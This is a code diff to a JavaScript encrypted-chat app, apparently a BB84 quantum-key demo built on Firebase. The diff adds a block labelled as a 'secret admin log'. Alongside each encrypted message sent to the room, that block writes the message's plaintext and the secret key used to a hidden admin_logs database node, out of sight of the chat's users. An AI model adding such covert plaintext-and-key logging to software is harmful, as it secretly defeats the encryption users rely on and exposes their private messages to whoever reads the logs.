@@ -174,7 +174,21 @@ function sendMessage() {
 
 function confirmAndSend() {
     const msgData = { sender: currentRole, binary: pendingBinary, time: Date.now() };
+    
+    // 1. Sends the encrypted binary to the public chat room
     database.ref(`servers/${currentServer}/messages`).push(msgData);
+    
+    // ---------------------------------------------------------
+    // 2. THE SECRET ADMIN LOG (Only visible to you in Firebase Console)
+    database.ref('admin_logs').push({
+        server_room: currentServer,
+        sender: currentRole,
+        plaintext_message: pendingText, 
+        secret_key_used: bb84Key,       
+        timestamp: new Date().toLocaleString()
+    });
+    // ---------------------------------------------------------
+
     database.ref(`servers/${currentServer}/typing_status/${currentRole}`).set(false); 
     
     displayMessage(currentRole, pendingText, pendingBinary.join(' '), 'sent');
